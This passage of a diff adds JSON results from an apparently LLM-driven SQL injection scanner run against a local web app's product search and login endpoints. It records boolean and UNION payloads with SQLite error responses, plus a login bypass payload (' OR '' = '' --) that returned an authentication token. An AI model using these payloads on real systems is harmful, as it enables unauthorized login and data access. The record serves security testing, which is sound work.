+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            }
+          ]
+        }
+      ],
+      "parameter": "q",
+      "parameter_location": "query",
+      "path_index": null,
+      "original_value": null,
+      "payload": " OR 'a'='e",
+      "payload_rationale": "Repair the delimiter/parenthesis/comment shape by adding a closing quote to the previous payload.",
+      "expected_signal": "SQL parser/database error",
+      "observed_signal": "sql_error",
+      "evidence": "Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id=\"stacktrace\"></ul>     </div>   </body> </html> ",
+      "baseline_status": 200,
+      "probe_status": 500
+    },
+    {
+      "method": "GET",
+      "url": "http://127.0.0.1:8080/rest/products/search",
+      "path": "/rest/products/search",
+      "endpoint_context": {
+        "endpoint_type": "search",
+        "resource": "product search results",
+        "likely_sql_context": "string_search",
+        "recommended_attack_style": "string_search_error_probe",
+        "avoid_payload_styles": [
+          "auth_bypass",
+          "numeric_probe"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.8,
+        "reason": "search endpoint with query parameter"
+      },
+      "target_params": [
+        {
+          "name": "q",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "search",
+            "resource": "product search results",
+            "likely_sql_context": "string_search",
+            "recommended_attack_style": "string_search_error_probe",
+            "avoid_payload_styles": [
+              "auth_bypass",
+              "numeric_probe"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.8,
+            "reason": "search endpoint with query parameter"
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.8,
+            "reason": "search endpoint with query parameter",
+            "starting_strategy": "string_search_error_probe"
+          },
+          "payload_count": 7,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='a",
+              "payload_rationale": "string_search_error_probe",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2086,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2101,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 15,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "read_confirmation",
+              "payload": "UNION SELECT NULL, 'marker'",
+              "payload_rationale": "The payload string must come from your reasoning, not from code constants. Using UNION SELECT with a harmless marker string.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "marker",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2098,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2088,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 984,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 954,
+                "body_changed": true,
+                "elapsed_delta_ms": -10,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false,
+                "read_marker": "marker",
+                "read_marker_reflected": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='b",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by changing the boolean condition.",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2091,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2085,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": -6,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='c",
+              "payload_rationale": "Add a single quote to the payload to fix the missing delimiter issue.",
+              "expected_signal": "SQL parser error with a syntax error message",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2064,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2103,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 39,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='d",
+              "payload_rationale": "Add a different character to the payload to avoid repeating the exact shape of the previous payload.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2066,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2071,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 5,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='e",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by adding a closing quote to the previous payload.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2056,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2083,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 27,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='g",
+              "payload_rationale": "The previous payload was rejected for repeating an already attempted payload. The next payload should contain a different value.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2087,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2087,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 0,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            }
+          ],
+          "final_decision": "escalate",
+          "strongest_decision": "escalate",
+          "stop_reason": "Max attempts reached.",
+          "confirmation_rejections": [
+            {
+              "payload": "UNION SELECT NULL, NULL",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: String/search probe rejected because it lacks a string delimiter."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "String/search probe rejected because it lacks a string delimiter.",
+                "next_step": "Return only a parameter value that includes a quote or double-quote delimiter and a harmless boolean comparison."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 954,
+                "body_changed": true,
+                "elapsed_delta_ms": -10,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false,
+                "read_marker": "marker",
+                "read_marker_reflected": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            }
+          ]
+        }
+      ],
+      "parameter": "q",
+      "parameter_location": "query",
+      "path_index": null,
+      "original_value": null,
+      "payload": " OR 'a'='g",
+      "payload_rationale": "The previous payload was rejected for repeating an already attempted payload. The next payload should contain a different value.",
+      "expected_signal": "SQL parser/database error",
+      "observed_signal": "sql_error",
+      "evidence": "Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id=\"stacktrace\"></ul>     </div>   </body> </html> ",
+      "baseline_status": 200,
+      "probe_status": 500
+    },
+    {
+      "method": "POST",
+      "url": "http://127.0.0.1:8080/rest/user/login",
+      "path": "/rest/user/login",
+      "endpoint_context": {
+        "endpoint_type": "auth_login",
+        "resource": "User Login",
+        "likely_sql_context": "auth_lookup",
+        "recommended_attack_style": "auth_boolean_bypass",
+        "avoid_payload_styles": [
+          "union_enum",
+          "auth_bypass",
+          "numeric_probe"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.9,
+        "reason": "Endpoint is a login form with email and password fields, suggesting an authentication lookup"
+      },
+      "target_params": [
+        {
+          "name": "email",
+          "in": "json",
+          "endpoint_context": {
+            "endpoint_type": "auth_login",
+            "resource": "User Login",
+            "likely_sql_context": "auth_lookup",
+            "recommended_attack_style": "auth_boolean_bypass",
+            "avoid_payload_styles": [
+              "union_enum",
+              "auth_bypass",
+              "numeric_probe"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.9,
+            "reason": "Endpoint is a login form with email and password fields, suggesting an authentication lookup"
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.9,
+            "reason": "Endpoint is a login form with email and password fields, suggesting an authentication lookup",
+            "starting_strategy": "auth_boolean_bypass"
+          },
+          "payload_count": 1,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": "' OR '' = '' --",
+              "payload_rationale": "Repair the previous payload rejection by adding a single quote and a line comment marker.",
+              "expected_signal": "SQL parser error or auth probe success",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 401,
+                "elapsed_ms": 2073,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 26,
+                "body_sample": "Invalid email or password."
+              },
+              "probe": {
+                "status_code": 200,
+                "elapsed_ms": 2088,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 799,
+                "body_sample": "{\"authentication\":{\"token\":\"[REDACTED]\",\"bid\":1,\"umail\":\"[REDACTED_EMAIL]\"}}"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 401,
+                "probe_status": 200,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 773,
+                "body_changed": true,
+                "elapsed_delta_ms": 15,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
+                "auth_bypass_like": true
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Baseline failed authorization/authentication, while probe succeeded.",
+                "next_step": "Stop; authentication-bypass evidence is sufficient."
+              }
+            }
+          ],
+          "final_decision": "escalate",
+          "strongest_decision": "escalate",
+          "stop_reason": "Stopped after sufficient authentication-bypass evidence."
+        },
+        {
+          "name": "password",
+          "in": "json",
+          "endpoint_context": {
+            "endpoint_type": "auth_login",
+            "resource": "User Login",
+            "likely_sql_context": "auth_lookup",
+            "recommended_attack_style": "auth_boolean_bypass",
+            "avoid_payload_styles": [
+              "union_enum",
+              "auth_bypass",
+              "numeric_probe"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.9,
+            "reason": "Endpoint is a login form with email and password fields, suggesting an authentication lookup"
+          },
+          "suitability": {
+            "probe": false,
+            "confidence": 0.9,
+            "reason": "Skipped password field because an identity field is available for authentication-query testing.",
+            "starting_strategy": "skip_identity_field_preferred"
+          },
+          "payload_count": 0,
+          "attempts": [],
+          "final_decision": "stop",
+          "strongest_decision": "stop",
+          "stop_reason": "Skipped by suitability gate: Skipped password field because an identity field is available for authentication-query testing."
+        }
+      ],
+      "parameter": "email",
+      "parameter_location": "json",
+      "path_index": null,
+      "original_value": null,
+      "payload": "' OR '' = '' --",
+      "payload_rationale": "Repair the previous payload rejection by adding a single quote and a line comment marker.",
+      "expected_signal": "SQL parser error or auth probe success",
+      "observed_signal": "authentication_bypass",
+      "evidence": "Baseline returned 401, probe returned 200 with authentication data.",
+      "baseline_status": 401,
+      "probe_status": 200
+    }
+  ],
+  "capability_summary": {
+    "confirmed_surface_count": 2,
+    "confirmed_techniques": [
+      "authentication_bypass",
+      "error_based_sqli"
+    ],
+    "dbms_hints": [
+      "sqlite"
+    ],
+    "confirmed_surfaces": [
+      {
+        "method": "GET",
+        "path": "/rest/products/search",
+        "parameter": "q",
+        "endpoint_type": "search",
+        "technique": "error_based_sqli",
+        "payload": " OR 'a'='a"
+      },
+      {
+        "method": "GET",
+        "path": "/rest/products/search",
+        "parameter": "q",
+        "endpoint_type": "search",
+        "technique": "error_based_sqli",
+        "payload": " OR 'a'='b"
+      },
+      {
+        "method": "GET",
+        "path": "/rest/products/search",
+        "parameter": "q",
+        "endpoint_type": "search",
+        "technique": "error_based_sqli",
+        "payload": " OR 'a'='c"
+      },
+      {
+        "method": "GET",
+        "path": "/rest/products/search",
+        "parameter": "q",
+        "endpoint_type": "search",
+        "technique": "error_based_sqli",
